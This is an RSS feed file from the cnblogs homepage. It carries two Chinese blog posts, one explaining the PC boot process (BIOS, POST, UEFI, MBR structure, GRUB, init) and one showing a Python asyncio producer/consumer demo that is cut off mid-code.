<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>计算机启动过程 - AdamWong</title>
<link>http://www.cnblogs.com/adamwong/p/10582183.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/adamwong/p/10582183.html</guid>
<description>&lt;p&gt;操作系统老师说，平时面试学生或者毕业答辩的时候他都会问这个问题，可见这个问题对于计算机专业的学生来说是如此重要。那么，从打开计算机电源到计算机的屏幕显示，中间经历了哪些过程呢？&lt;/p&gt;
&lt;p&gt;启动的英文是&lt;code&gt;boot&lt;/code&gt;，来自于一个谚语&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;pull oneself up by one's bootstraps
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过拉自己的鞋带把自己拽起&lt;/p&gt;
&lt;p&gt;这个很明显是矛盾的。工程师早期用这句谚语用来比喻早期的计算机开机，&lt;br/&gt;因为计算机启动需要运行程序，而运行程序又需要计算机启动。这个是一个很矛盾的过程。直到后来开机程序被刷入&lt;code&gt;ROM&lt;/code&gt;芯片后，这个开机的&lt;code&gt;boot&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;大概过程是这样的:&lt;/p&gt;
&lt;ol readability=&quot;1&quot;&gt;&lt;li&gt;
&lt;p&gt;Turn on&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;CPU jump to physical address of BIOS(In Intel it is 0xFFFF0)&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;BIOS runs POST(Power-On Self Test)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Find bootable devices&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;Loads boot sector from MBR&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;BIOS yields control to OS BootLoader&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;BIOS介绍:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;BIOS（Basic Input/Output System）是基本输入输出系统的简称。BIOS 能为电脑提供最低级、最直接的硬件控制与支持，是联系最底层的硬件系统和软件系统的桥梁。为了在关机后使 BIOS 不会丢失，早期的 BIOS 存储在 ROM 中，并且其大小不会超过 64KB；而目前的 BIOS 大多有 1MB 到 2MB，所以会被存储在 闪存（Flash Memory）中。&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;BIOS 设置程序是被固化到电脑主板上地 ROM 芯片中的一组程序，其主要功能是为电脑提供最底层的、最直接的硬件设置和控制。 BIOS 通常与&lt;br/&gt;&lt;strong&gt;硬件系统&lt;/strong&gt;集成在一起（在计算机主板的 ROM 或EEPROM 中），所以也被称为 &lt;strong&gt;固件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.lifewire.com/thmb/AeRVf2oW46AaeaFSwSGDxFHGF28=/768x0/filters:no_upscale():max_bytes(150000):strip_icc()/phoenix-bios-setup-utility-5a0b5e1cda271500370cf924.PNG&quot; alt=&quot;BIOS界面&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如何运行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;BIOS存放在一个断电后不会丢失内容的ROM中，这保证了“拽着鞋带拉起自己”的这种情况不会发生。因为系统一上电或重置，处理器要执行第一条指令的地址会被定位到BIOS存储器，初始化开始运行。在X86系统中，CPU加电后跳转至BIOS的固定物理地址0xFFFF0。&lt;br/&gt;打开计算机电源，计算机会首先加载BIOS，包含&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;CPU相关信息
设备启动顺序信息
硬盘信息
内存信息
时钟信息
PhP特性
...&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;硬件自检(Power-On Self Test,POST)&lt;/strong&gt;&lt;br/&gt;如果硬件出现问题，主板会发出不同含义的蜂鸣 ，启动中止。如果没有问题，屏幕就会显示出CPU 、内存、硬盘等信息。BIOS在执行完硬件自检和初始化后，会将自己复制到从 0xA0000 开始的物理内存中并继续执行。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;BIOS 代码包含诊断功能，以保证某些重要硬件组件，像是
键盘、磁盘设备、输出输入端口等等，可以正常运作且正
确地初始化。&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;BIOS产生的问题&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;开发效率低：大部分BIOS代码使用汇编开发，开发效率不言而喻。汇编开发的另一个缺点是使得代码与设备的耦合程度太高，代码受硬件变化的影响大。&lt;/li&gt;
&lt;li&gt;性能差：BIOS基本输入/输出服务需要通过中断来完成，开销大，并且BIOS没有提供异步工作模式，大量的时间消耗在等待上。&lt;/li&gt;
&lt;li&gt;功能扩展性差，升级缓慢：BIOS代码采用静态链接，增加硬件功能时，必须将16位代码放置在0x0C0000～0x0DFFFF区间，初始化时将其设置为约定的中断处理程序。而且BIOS没有提供动态加载设备驱动的方案。&lt;/li&gt;
&lt;li&gt;安全性：BIOS运行过程中对可执行代码没有安全方面的考虑。&lt;/li&gt;
&lt;li&gt;不支持从硬盘２TB以上的地址引导：受限于BIOS硬盘的寻址方式，BIOS硬盘采用32位地址，因而引导扇区的最大逻辑块地址是232(换算成字节地址，即232×512=2TB)&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;由于这些问题的存在，&lt;code&gt;UEFI&lt;/code&gt;横空出世&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload.wikimedia.org/wikipedia/commons/8/8d/Efi_flowchart_extended.jpg?1553175603751&quot;/&gt;&lt;/p&gt;
&lt;p&gt;UEFI中文名为&lt;strong&gt;统一可扩展固件界面&lt;/strong&gt;(英语：Unified Extensible Firmware Interface，缩写&lt;strong&gt;UEFI&lt;/strong&gt;)是一种个人电脑系统规格，用来定义操作系统与系统硬件之间的软件界面，作为BIOS的替代方案。可扩展固件接口负责加电自检（POST），联系操作系统以及提供连接作业系统与硬体的介面。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;UEFI与BIOS的几个区别&lt;/strong&gt;&lt;/p&gt;
&lt;ol readability=&quot;1.5&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;EFI使用模块化、C语言风格的参数堆栈传递方式以及动态链接形式构建的系统，相对于BIOS而言跟容易实现，容错和纠错特性更强，减少系统研发的时间。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;运行于32位或64位模式，面对未来增强的处理器模式下，能突破BIOS 16位代码的寻址能力，达到处理器最大寻址。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;UEFI有良好的鼠标操控图形化界面，在开机速度也比BIOS快不少&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;strong&gt;BIOS&lt;/strong&gt;过程&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1575923/201903/1575923-20190322235352840-872134986.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;UEFI&lt;/strong&gt;过程&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1575923/201903/1575923-20190322235517497-707866623.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;相对来说UEFI比BIOS少了一个硬件检测&lt;/p&gt;
&lt;p&gt;即使如此，本章启动过程还是着重于分析利用BIOS启动的过程。&lt;/p&gt;

&lt;p&gt;MBR-全称是Master Boot Record(主引导记录或主开机记录)，是一个512byte的扇区，位于磁盘的固定位置。之所以叫“主引导记录”，是因为其存在于驱动器开始部分的一个特殊扇区，个扇区包含已安装的操作系统启动记载器和驱动器的逻辑分区信息。BIOS完成POST和初始化之后，会根据CMOS中设定的顺序选择引导的设备，这个设备可以是U盘可以是硬盘。若设置为硬盘，则BIOS就会读取MBR。MBR里面包含了一段引导程序，一个分区表和Magic Number。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;MBR的结构&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.maixj.net/pics/uploads/2017/06/MBR.jpg&quot;/&gt;&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;3.5&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;1-445字节&lt;/td&gt;
&lt;td&gt;调用操作系统的机器码(Call OS)&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;447-510字节&lt;/td&gt;
&lt;td&gt;分区表(Partition table)&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;3&quot;&gt;&lt;td&gt;511-512字节&lt;/td&gt;
&lt;td&gt;主引导记录签名(只有两个，0x55和0xAA，为Magic Number)，如果不是这两个幻数，就认为这是一个没有被分区的硬盘。&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;分区表的长度只有64个字节，里面分为四项，每项为16个字节。所以一个硬盘只可以分四个一级分区，又叫做“主分区”。每个主分区的16个字节，结构如下&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;6.5&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;3&quot;&gt;&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;如果第一个为0x80，表示该主分区是激活分区(active)，控制权将转交给此分区。几个分区中只能有一个是激活分区，其他都是非激活分区(inactive)。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;2-4&lt;/td&gt;
&lt;td&gt;主分区的第一个扇区物理位置(柱面、磁头、扇区号等)&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;主分区的类型 分区类型符&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;6-8&lt;/td&gt;
&lt;td&gt;主分区最后一个扇区的物理位置&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;9-12&lt;/td&gt;
&lt;td&gt;主分区第一个扇区的逻辑位置&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;13-16&lt;/td&gt;
&lt;td&gt;主分区的扇区总数，决定了主分区的长度&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;其中第5字节分区类型符，有如下特定符&lt;/p&gt;
&lt;p&gt;00H H —— 表示该分区未用 （ 即没有指定 ） ；&lt;/p&gt;
&lt;p&gt;06H H —— FAT 16 基本分区；&lt;/p&gt;
&lt;p&gt;0 0 BH —— FAT 32 基本分区；&lt;/p&gt;
&lt;p&gt;05H H —— 扩展分区；&lt;/p&gt;
&lt;p&gt;07H H —— NTFS 分区；&lt;/p&gt;
&lt;p&gt;0 0 FH —— （ LBA 模式 ） 扩展分区 (83H H 为 Linux)&lt;/p&gt;
&lt;p&gt;分出主分区后，其余的部分可以分成扩展分区，一般是剩下的部分全部分成扩展分区，也可以不全分，剩下的部分就浪费了。扩展分区不能直接使用，必须分成若干逻辑分区。所有的逻辑分区都是扩展分区的一 部分 。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;硬盘的容量 ＝ 主分区的容量 ＋ 扩展分区的容量

扩展分区的容量 ＝ 各个逻辑分区的容量之和&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://resources.infosecinstitute.com/wp-content/uploads/040213_2007_LinuxBootin1.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;​ &lt;strong&gt;Linux的Boot的过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Boot Loader&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;又叫做 操作系统内核加载器(OS kernel loader)，一个在&lt;code&gt;kernel&lt;/code&gt;运行前运行的一段小程序，通过这段程序可以初始化硬件设备，建立内存空间的映射，将系统软硬件环境带到一个合适的状态，便于未来调用操作系统内核。&lt;/p&gt;
&lt;p&gt;Linux下引导加载程序常见两种&lt;a href=&quot;https://www.wikiwand.com/zh-hk/LILO&quot;&gt;LILO&lt;/a&gt;和&lt;a href=&quot;https://www.wikiwand.com/zh/GNU_GRUB&quot;&gt;GNU GRUB&lt;/a&gt;&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;无交互命令界面&lt;/td&gt;
&lt;td&gt;有交互命令界面&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;不支持网络引导&lt;/td&gt;
&lt;td&gt;支持&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;4&quot;&gt;&lt;td&gt;错误配置MBR会让系统无法引导&lt;/td&gt;
&lt;td&gt;如果配置文件错误，则默认跳转到GRUB命令行界面&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;GRUB 磁盘引导的过程如下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;- stage1: grub 读取磁盘第一个 512 字节(硬盘的0道0 面1扇区，被称为 MBR (主引导记录)， 也称为bootsect )。 MBR 由一部分 bootloader 的引导代
码、分区表和魔数三部分组成。（ 启动的第二步 ）
- Stage1.5: 识别各种不同的文件系统格式。这使得 grub 识别到文件系统。
- stage2: 加载系统引导菜单 (/boot/grub/ menu.lst或 grub.lst) ) ，加载内核映像 (kernel image) 和 RAM磁盘 initrd （可选）。&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;运行主引导程序的具体过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;BIOS将硬盘主引导记录读入7C00处，并将控制权交给主引导程序:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;检查0x7dfe地址处是否等于0xaa55。不是则去其他介质；如果没有启动的介质，显示“No ROME BASIC”并死机。&lt;/li&gt;
&lt;li&gt;成功找到介质，跳转到0X7C00执行MBR的程序&lt;/li&gt;
&lt;li&gt;将自己复制到0x0600处且继续执行&lt;/li&gt;
&lt;li&gt;主分区表中搜索标志为激活的分区，如果发现没有激活分区或者不止一个激活分区则停止。&lt;/li&gt;
&lt;li&gt;将激活分区的第一个扇区读入内存地址0x7c00&lt;/li&gt;
&lt;li&gt;再次检查位于地址0x7dfe的内容是否等于0xaa55，若不等则停止并尝试软盘启动&lt;/li&gt;
&lt;li&gt;跳转到0x7c00继续执行特定系统的启动程序&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;strong&gt;补充：MBR和引导扇区的关系&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1575923/201903/1575923-20190322235548875-1362994985.png&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;MBR存放的位置是整个硬盘的第一个扇区&lt;/li&gt;
&lt;li&gt;Boot Sector是硬盘上每一个分区的第一个扇区&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;主要有两个步骤:&lt;/p&gt;
&lt;ol readability=&quot;1&quot;&gt;&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;根据 grub 设定的内核映像所在路径 ,系统读取内存映像 ,并进行解压缩操&lt;br/&gt;作 。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;系统将解压后的内核放置在内存之中， 初始化函数并初始化各种设备 ， 完&lt;br/&gt;成 Linux 核心环境的建立 。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;以Linux系统为例，先载入/boot目录下面的kernel。&lt;/p&gt;
&lt;p&gt;内核加载成功后，第一个运行的程序是/sbin/init。它根据配置文件（Debian系统是/etc/initab）产生init进程。这是Linux启动后的第一个进程，pid进程编号为1，其他进程都是它的后代。&lt;/p&gt;
&lt;p&gt;然后，init线程加载系统的各个模块，比如窗口程序和网络程序，直至执行/bin/login程序，跳出登录界面，等待用户输入username和password。&lt;/p&gt;
&lt;p&gt;至此，全部启动过程完成。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1575923/201903/1575923-20190322235336116-1923591233.png&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 15:56:00 +0000</pubDate>
<dc:creator>AdamWong</dc:creator>
<og:description>介绍 操作系统老师说，平时面试学生或者毕业答辩的时候他都会问这个问题，可见这个问题对于计算机专业的学生来说是如此重要。那么，从打开计算机电源到计算机的屏幕显示，中间经历了哪些过程呢？ 启动的英文是 ，</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/adamwong/p/10582183.html</dc:identifier>
</item>
<item>
<title>关于asyncio知识（四） - python修行路</title>
<link>http://www.cnblogs.com/zhaof/p/10581972.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhaof/p/10581972.html</guid>
<description>&lt;h2 id=&quot;h2--asyncio-&quot;&gt;一、使用 asyncio 总结&lt;/h2&gt;
&lt;p&gt;最近在公司的一些项目中开始慢慢使用python 的asyncio, 使用的过程中也是各种踩坑，遇到的问题也不少，其中有一次是内存的问题，自己也整理了遇到的问题以及解决方法详细内容看：&lt;a href=&quot;https://www.syncd.cn/article/memory_trouble&quot;&gt;https://www.syncd.cn/article/memory_trouble&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在前面整理的三篇asyncio文章中，也都是使用asyncio的一些方法，但是在实际项目中使用还是避免不了碰到问题， 在这周的工作中遇到之前碰见过的问题，一个初学asyncio写代码中经常会碰到的问题，我的业务代码在运行一段时间后提示如下错误提示：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
Task was destroyed but it &lt;span&gt;is&lt;/span&gt; pending!task: &amp;lt;Task pending coro=&amp;lt;HandleMsg.get_msg() done, defined at ex10.py:17&amp;gt; wait_for=&amp;lt;Future cancelled&amp;gt;&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这个错误我在前面几篇关于asyncio的系列文章中也反复说过这个问题，我也认为自己不会在出现这种问题，但是意外的是，我的程序还是出现了这个错误。&lt;/p&gt;
&lt;p&gt;我将我的业务代码通过一个demo代码进行模拟复现以及解决这个问题，下面整理的就是这个过程&lt;/p&gt;
&lt;h2 id=&quot;h2--task-was-destroyed-but-it-is-pending-&quot;&gt;二、“Task was destroyed but it is pending!”&lt;/h2&gt;
&lt;p&gt;我通过下面这张图先描述一下demo程序的逻辑：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/997599/201903/997599-20190322225901944-77229557.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; asyncio
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; asyncio &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Queue
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; uuid
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; asyncio &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Lock
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; asyncio &lt;span&gt;import&lt;/span&gt;&lt;span&gt; CancelledError
queue &lt;/span&gt;=&lt;span&gt; Queue()
&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; HandleMsg(object):
    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; &lt;span&gt;__init__&lt;/span&gt;&lt;span&gt;(self, unid, coroutine_queue, handle_manager):
        self.unid &lt;/span&gt;=&lt;span&gt; unid
        self.coroutine_queue &lt;/span&gt;=&lt;span&gt; coroutine_queue
        self.handle_manager &lt;/span&gt;=&lt;span&gt; handle_manager
    async &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; get_msg(self):
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
            coroutine_msg &lt;/span&gt;=&lt;span&gt; await self.coroutine_queue.get()
            msg_type &lt;/span&gt;= coroutine_msg.get(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;msg&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; msg_type == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;start&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
                &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;recv unid [%s] is start&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; %&lt;span&gt; self.unid)
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
                &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;recv unid [%s] is end&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; %&lt;span&gt; self.unid)
                &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 每个当一个unid收到end消息为结束&lt;/span&gt;
&lt;span&gt;                await self.handle_manager.del_unid(self.unid)
&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; HandleManager(object):
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
    用于unid和queue的关系的处理
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
    &lt;span&gt;def&lt;/span&gt; &lt;span&gt;__init__&lt;/span&gt;&lt;span&gt;(self):
        self.loop &lt;/span&gt;=&lt;span&gt; asyncio.get_event_loop()
        self.lock &lt;/span&gt;= Lock(loop=&lt;span&gt;self.loop)
        self.handle_dict &lt;/span&gt;=&lt;span&gt; dict()
    async &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; unid_bind(self, unid, coroutine_queue):
        async with self.lock:
            self.handle_dict[unid] &lt;/span&gt;=&lt;span&gt; coroutine_queue
    async &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; get_queue(self, unid):
        async with self.lock:
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; unid &lt;span&gt;in&lt;/span&gt;&lt;span&gt; self.handle_dict:
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; self.handle_dict[unid]
    async &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; del_unid(self, unid):
        async with self.lock:
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; unid &lt;span&gt;in&lt;/span&gt;&lt;span&gt; self.handle_dict:
                self.handle_dict.pop(unid)
&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; make_uniqueid():
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
    生成unid
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
    uniqueid &lt;/span&gt;=&lt;span&gt; str(uuid.uuid1())
    uniqueid &lt;/span&gt;= uniqueid.split(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    uniqueid.reverse()
    uniqueid &lt;/span&gt;= &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;.join(uniqueid)
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; uniqueid
async &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; product_msg():
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
    生产者
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
    &lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
        unid &lt;/span&gt;=&lt;span&gt; make_uniqueid()
        msg_start &lt;/span&gt;= {&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;unid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: unid, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;msg&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;start&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;}
        await queue.put(msg_start)
        msg_end &lt;/span&gt;= {&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;unid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: unid, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;msg&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;end&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;}
        await queue.put(msg_end)
        loop &lt;/span&gt;=&lt;span&gt; asyncio.get_event_loop()
        await asyncio.sleep(&lt;/span&gt;0.2, loop=&lt;span&gt;loop)
async &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; consumer_from_queue(handle_manager):
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;
    消费者
    &lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
    &lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
        msg &lt;/span&gt;=&lt;span&gt; await queue.get()
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;consumer recv %s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; %&lt;span&gt; msg)
        msg_type &lt;/span&gt;= msg.get(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;msg&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
        unid &lt;/span&gt;= msg.get(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;unid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; msg_type == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;start&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
            coroutine_queue &lt;/span&gt;= Queue()  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 用于和handle_msg协程进行数据传递&lt;/span&gt;
            handle_msg =&lt;span&gt; HandleMsg(unid, coroutine_queue, handle_manager)
            await handle_manager.unid_bind(unid, coroutine_queue)
            await coroutine_queue.put(msg)
            loop &lt;/span&gt;=&lt;span&gt; asyncio.get_event_loop()
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 每次的start消息创建一个task 去处理消息&lt;/span&gt;
&lt;span&gt;            loop.create_task(handle_msg.get_msg())
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
            coroutine_queue &lt;/span&gt;=&lt;span&gt; await handle_manager.get_queue(unid)
            await coroutine_queue.put(msg)
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;__name__&lt;/span&gt; == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;__main__&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
    loop &lt;/span&gt;=&lt;span&gt; asyncio.get_event_loop()
    handle_manager &lt;/span&gt;=&lt;span&gt; HandleManager()
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;  在最开始创建了两个task 分别是生产者和消费者&lt;/span&gt;
&lt;span&gt;    loop.create_task(product_msg())
    loop.create_task(consumer_from_queue(handle_manager))
